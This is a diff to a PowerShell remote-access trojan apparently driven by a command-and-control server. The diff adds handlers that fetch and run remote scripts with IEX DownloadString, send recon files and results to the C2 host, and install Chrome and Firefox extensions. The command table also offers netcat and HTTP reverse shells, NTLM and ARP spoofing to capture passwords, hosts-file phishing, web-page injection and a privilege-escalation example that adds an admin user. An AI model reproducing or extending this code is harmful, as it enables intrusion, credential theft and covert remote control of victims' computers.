@@ -616,7 +616,7 @@ Function Invoke-Pnt {
 			[string]$id
 			)
 			[string] $xmlpilot = $LatestOrder.split('|')[1]
-            Write-Verbose "Send command at:  $xmlpilot"
+            Write-Verbose "Process command at:  $xmlpilot"
 			$XMLCmdAutoPilot = New-Object System.Xml.XmlDocument
             $XMLCmdAutoPilot.Load($xmlpilot)
 			$cmd = $XMLCmdAutoPilot.autopilot.pilot.cmd
@@ -750,14 +750,14 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 			$result = "injected"
 			sendC2 $pc $result $id
 			}
-		Function ArpSpoofCommand { # !arpspoof  -  Run arp spoofing and capture packet
+		Function ArpSpoofCommand { # !arpspoof  -  Run MAC spoofing and capture packet
             [CmdletBinding()] param( 
 			[string]$id
 			)
 			downloadFile "$c2c/ROOT_FOLDER/LINK_FOLDER/arp.txt" "$env:userprofile\AppData\arp.exe"
 			$Command = "$env:userprofile\AppData\arp.exe -i";
 			RunJob -code $Command;
-			$result = "ok - may not work if NO winpcap lib";
+			$result = "ok - may not work if NO winpcap lib (use !choco to install wnpcap lib";
 			sendC2 $pc $result $id;
 		   }
 	# Recon, Discovery &scanning  > BEGIN
@@ -768,8 +768,12 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 			$reconfile = "recon"+$pc+".txt"
 			$reconfile0 = "$env:userprofile\AppData\"+$reconfile
 			IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/recon.txt")
-            ModReconCommand $reconfile0
-			$result = " -Powershell_version: $pshversion   - Current_user_admin_membership: $IsAdminMember - Shell_priveleged: $IsAdmin  -  $c2c/ROOT_FOLDER/exfil/$pc/$reconfile"
+            $reconresult = ModReconCommand $reconfile0
+			$result = " -Powershell_version: $pshversion `r`n"
+			$result += "- Current_user_admin_membership: $IsAdminMember `r`n"
+			$result += "- Shell_privileged: $IsAdmin  `r`n"
+			$result += "- File Results: $c2c/ROOT_FOLDER/exfil/$pc/$reconfile"
+			$result += $reconresult
 			Exfiltrate $reconfile0
 			Remove-Item $reconfile0
 			sendC2 $pc $result $id
@@ -791,7 +795,7 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 			$result += " ---  Privileged Shell: $isAdmin "
 			sendC2 $pc $result $id
 			}			
-		Function ScanCommand { #!scan|192.168.10.10 - Network port scanning like with Nmap, all over the LAN
+		Function NmapCommand { #!nmap|192.168.10.10 - Network port scanning like with Nmap, all over the LAN
             [CmdletBinding()] param( 
 			[string]$id
 			)
@@ -813,6 +817,14 @@ Interceptor -Tamper -SearchString "</head>" -ReplaceString "<iframe src=beefserv
 			#"@
 			exfiltrate "$env:userprofile\AppData\scan.txt"
 			#RunJob -code $Command
+			}
+		Function VulnScanCommand { #!vulnscan - Vulnerabilities scanning like with Nessus (only local)
+            [CmdletBinding()] param( 
+			[string]$id
+			)
+			iex(New-Object Net.WebClient).DownloadString('"$c2c/ROOT_FOLDER/LINK_FOLDER/vulnscan.txt');
+            $result = Invoke-Vulmap 
+			sendC2 $pc $result $id
 			}
 		Function ArpScanCommand { #!arp - Scan ARP Table and display neighbors
             [CmdletBinding()] param( 
@@ -1304,7 +1316,7 @@ PsHttp -BINDING "http://127.0.0.1:80" -REDIRECTTO $Redirect_PhishingURL
 			# write on hosts.txt
 			$g = get-content "C:\Windows\System32\drivers\etc\hosts.txt"
 			add-content "C:\Windows\System32\drivers\etc\hosts.txt" -Value "127.0.0.1	$SiteToPhish"
-			$result = "ok";
+			$result = netstat | findstr 127.0.0.1:80
 			sendC2 $pc $result $id
 		   }   
 		Function HttpServerCommand { # !http|8080  -  setup local http server and host a page (Efficient if used with DNSSPOOF: you setup phishing page and you host redir.html To redirect local victim to your phishing page
@@ -1472,7 +1484,7 @@ IEX ((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/chr
 			sendC2 $pc $result $id
 		}	
 	# Privileges escalation  > BEGIN
-		Function PrivescCommand {  # !privesc
+		Function PrivescCommand {  # !privesc - Check local privesc vulnerabilities (sherlock  & powerUp)
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -1730,9 +1742,14 @@ $env:userprofile\Appdata\tun.exe authtoken $authkey
 $env:userprofile\Appdata\tun.exe $protocol $port --log=stdout > $env:userprofile\Appdata\e.log
 "@
 			RunJob -code $c
-			[string]$result = "Read the tunnel ID in ngrok Account and use it to connect PC"
+			if ($pshversion -lt 3) {
+				$result = $env:userprofile\AppData\cl.exe http://127.0.0.1:4040/api/tunnels
+				#executer -runLocal $Command2
+			} else {
+				[string]$result = Invoke-WebRequest -Uri "http://127.0.0.1:4040/api/tunnels"
+			}
 			sendC2 $pc $result $id
-		}
+		}		
 		Function SocksProxyCommand {  # !socks|1234 -- Create a Socks 4/5 proxy on port 1234, configure your browser to use socks and browse in the context of this pc
 		[CmdletBinding()] param( 
 		[string]$id
@@ -2025,7 +2042,7 @@ Invoke-DBC2
 			$result = "VNC ready|ReverseIP:$VncIPreverse|Port:$VncPort|Pass:$VncPass"
 			sendC2 $pc $result $id
 			}
-		Function RDPCommand { 	 # !rdp -- Activate RDP and expose 3389 port with ngrok over Internet
+		Function RDPCommand { 	 # !rdp -- Activate RDP and you can use !ngrok to expose 3389 port over Internet
 			[CmdletBinding()] param( 
 			[string]$id
 			)
@@ -2069,6 +2086,33 @@ iex((New-Object Net.WebClient).DownloadString("http://$serverIPorUrl/connect"))
 			$result = "Server side: powershell.exe -Exec Bypass -File c:\AttackerPC\HttpRatServer.ps1 - You edit it before (Better use ngrok URL)"
 			sendC2 $pc $result $id
 			}  
+		Function ChromeExtCommand {  # !chromeextension|bhpijbhnnpcobofdieiocbphkdjjbef  
+			[CmdletBinding()] param( 
+			[string]$id
+			)
+			[string] $extensionID = $LatestOrder.split('|')[2]
+			$cmde = @"
+iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/ChromeExtension.txt"))
+New-ChromeExtension -Extension $extensionID -Mode User
+"@
+			RunJob -code $cmde	
+			$result = "Extension installed - Reboot browser"
+			sendC2 $pc $result $id
+			} 
+		Function FirefoxExtCommand {  # !firefoxextension|http://ext.xpi
+			[CmdletBinding()] param( 
+			[string]$id
+			)
+			[string] $extensionURI = $LatestOrder.split('|')[1]	
+			[string] $extensionPath = "$env:userprofile\Appdata\"
+			$cmde = @"
+iex((New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/firefoxExtension.txt"))
+New-FirefoxExtension -ExtensionUri $extensionURI -ExtensionPath $extensionPath -Hive HKCU
+"@
+			RunJob -code $cmde	
+			$result = "Extension installed - Reboot browser"
+			sendC2 $pc $result $id
+			} 			
 		Function NetCatShell {  # !nc|212.74.21.23  OR  !nc|xxxxxx.ngrok.io   - RUN BEFORE Server side: nc —v —l —p (port)  
 			[CmdletBinding()] param( 
 			[string]$id
@@ -2494,15 +2538,16 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
                 !checkwmi {CheckWMICommand $id}		  #  !checkwmi -- Get WMI value to verify PC ID persistent value registration AND WMI persistence entry
 				!thunder {ThunderCommand $id} 		  #  !thunder|http://www.youtube.com/watch?v=v2AC41dglnM
                 !eicar {EicarCommand $id}			  #  !eicar      -    Triggering AV alarm
-                !scan {ScanCommand $id}   			  #  !scan       -    Network port scanning like with Nmap, all over the LAN
-                !wcry {WannacryCheckCommand $id}      #  !wcry       -    Check system against WannaCry MS17-010 vulnerability
+                !nmap {NmapCommand $id}   			  #  !nmap       -    Network port scanning like with Nmap, all over the LAN
+				!vulnscan {VulnScanCommand $id}   	  #  !vulnscan   -    Vulnerabilities scanning like with Nessus (only local)
+				!wcry {WannacryCheckCommand $id}      #  !wcry       -    Check system against WannaCry MS17-010 vulnerability
 				!popup {PopupCommand $id}			  #  !popup|Administrative credentials are needed to install a pending update. You will be prompted shortly.|UPDATE PENDING
                 !persist {PersistCommand $id}		  #  !persist|reg/ startup/ task/ wmi/ sc/ all |calc
                 !runas {RunAsCommand $id}		      #  !runas|IEX(New-Object Net.WebClient).DownloadString("http://c2/LINK_FOLDER/pnt.ps1"))
 				!privesc {PrivescCommand $id}	      #  !privesc - Try to inject token in privilegied process and Check local privesc vulnerabilities (sherlock  & powerUp)
 				!getsystem {GetsystemCommand $id}     #  !getsystem|1/2/3/4 - Try various privesc technic (obtain PID like !getpid|lsass)
 				!ntlmspoof {InveighCommand $id}	  	  #  !ntlmspoof   - Use inveigh to peform Spoofing attack and capture various password (SMB, NTLM, HTTP, WPAD ...)
-				!arpspoof {ArpspoofCommand $id}	  	  #  !arpspoof 
+				!arpspoof {ArpspoofCommand $id}	  	  #  !arpspoof - Run MAC spoofing attack (MITM)
 				!arp {ArpScanCommand $id}	  	  	  #  !arp  -  ping all the IP scope and return resulting arp cache (arp -a)
 				!webinject {WebInjectCommand $id}	  #  !webinject   - Use interceptor.txt to inject html content in every web request 
 				!hotpotatoes {HotPotatoes $id}        #  !hotpotatoes|net user tater Winter2016 /add && net localgroup administrators tater /add
@@ -2533,8 +2578,10 @@ IEX (New-Object Net.WebClient).DownloadString("$c2c/ROOT_FOLDER/LINK_FOLDER/setM
 				!nc{NetCatShell $id}                  #  !nc|AttackerIP|8080  -  use nc -lvp 8080 BEFORE to get shell back             
                 !jsrat {JsRatShell $id} 	 		  #  !jsrat|192.168.10.96     # Handle connexion with: powershell.exe -Exe Bypass -File c:\test\JSRat.txt  & change listening IP ADDRESS in jsrat file
                 !httprat {HttpRatShell $id}           #  !httprat|212.74.21.23  OR  !httprat|xxxxxx.ngrok.io   (without HTTP/s) 
+				!chromeextension {ChromeExtCommand $id}   #  !chromeextension|bhpijbhnnpcobofdieiocbphkdjjbef
+				!firefoxextension {FirefoxExtCommand $id} #  !firefoxextension|http://xxxxx/ext.xpi
 				!vnc {VncCommand $id}                 #  !vnc|bind||5900|pass1234   OR  §vnc|reverse|IP_of_attacker|5500|pass1234 - VNC remote connect
-				!rdp {RDPCommand $id}                 #	 !rdp|authkey  -  Activate RDP service (expose it with ngrok and connect)
+				!rdp {RDPCommand $id}                 #	 !rdp  -  Activate and start RDP service (expose it with ngrok and connect)
 				!credential {CredentialCommand $id}   #  !credential  -  Try to phish users credentials by tricking them
                 !wificreds {WifiCredsCommand $id}     #  !wificreds|SSID_NAME - Extract stored WIFI credentials}
 				!phish {PhishingCommand $id}          #  !phish|facebook.com|http://xxxx.ngok.io/facebook  -  setup local http server, host phishing page and spoof DNS hosts.txt
